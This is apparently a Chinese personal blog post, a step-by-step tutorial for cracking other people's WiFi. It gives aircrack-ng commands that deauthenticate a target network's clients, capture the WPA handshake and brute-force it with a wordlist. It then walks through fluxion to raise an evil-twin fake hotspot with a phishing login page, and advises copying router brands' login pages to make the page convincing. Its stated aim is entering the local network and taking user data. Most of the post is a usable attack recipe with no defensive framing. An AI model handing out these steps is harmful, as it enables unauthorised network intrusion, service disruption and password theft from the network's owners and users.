WIFI破解

Created2022-03-29|Updated2022-05-19|折腾吧
|Word count:780|Reading time:2min|Post View:

wifi抓cap包暴破

硬件：kali网卡

双频，2.4G/5GHz

抓握手包 包含了密文用户名密码

搜索 跑包

打进 内网 获取用户信息

iwconfig 查看无线网卡名称wlan0以及是否插好

service network-manager stop 所有网络服务停掉

airmon-ng check kill 干掉所有调用它的兄弟

airmon-ng start wlan0(网卡名) 开启无线网卡

ifconfig 看到无线网络的情况（wlan0变成了mon0-00名）

airodump-ng mon0 开启无线网卡侦测，BSSID是mac，data表示有连接

A4:1A:3A:86:0B:C5 -c 11

50:3A:A0:DA:A6:A0

D0:FF:98:24:64:D5

窗口2

airodump-ng mon0 –bssid [目标mac] -c [频道] -w [包写到目标文件的名字] 同时查看到连在该wifi上的设备的mac地址，选frames最活跃的

窗口1

aireplay-ng -0 [要发起攻击的次数:20] -a [目标wifi的mac] -c [连在该wifi上的设备mac] mon0[网卡] 发起断网攻击

之后设备会自动重连，传递含有账户密码的包给wifi，窗口1结束后，当别人再次连接时，在窗口2上看到wpa handshake，此时可以结束窗口2，在root目录下找到之前命名的文件夹，跑包.cap文件即可

跑包

aircrack-ng -w mima.txt[字典] haha-01.cap

网卡重新连接wifi

systemctl start NetworkManager 注意大小写 开启wifi自动管理

iwconfig 适用于WPA，所以即使账户密码正确也报错invalid arguement

wpa2用wpa_cli设置

wpa_cli基于wpa_supplicant

关于wpa_cli https://www.cnblogs.com/nm666/p/15567164.html

wpa_supplicant -i wlan0[接口名] 初始化该服务

/etc/init.d/networking start 启动networking服务

wifi钓鱼fluxion伪热点

工具

在当前用户目录下

ls进入fluxion，

./fluxion.sh 运行发现缺少依赖

./fluxion.sh -i 自动安装依赖

./fluxion.sh 运行

根据中文包来选择

提示

选择检查握手包获取状态——aireplay-ng 解除认证方式 侵略性

选择hash验证方法——cowpatty验证, cowpatty是一款WPA-PSK字典攻击软件,实现字典与目标包的匹配与爆破

如何进行验证——synchronously 同时的 同步的

弹出3个窗口抓包，抓到后关闭窗口

开始配置伪热点攻击

最后在fluxion文件夹下找密码

  • 总体思路，先带有加密密码的包，然后钓鱼密码，通过验证后结束钓鱼
  • 开始攻击后，6个窗口全部弹出，原wifi受到攻击，无法连接，手机端自动连接伪热点，局域网外可见两个相同伪热点，伪热点无小锁头
  • 验证网页我这里选择自带的通用认证网页（Chinese），虽然有些假，但是我们可以自己写一个认证网页以达到以假乱真的地步。根据路由器的厂家比如TP-link，水星，华为，等等等为其编写相应的路由认证网页（这一步是你能不能得到秘钥的关键）!

参考链接 https://blog.csdn.net/weixin_44419064/article/details/112908357
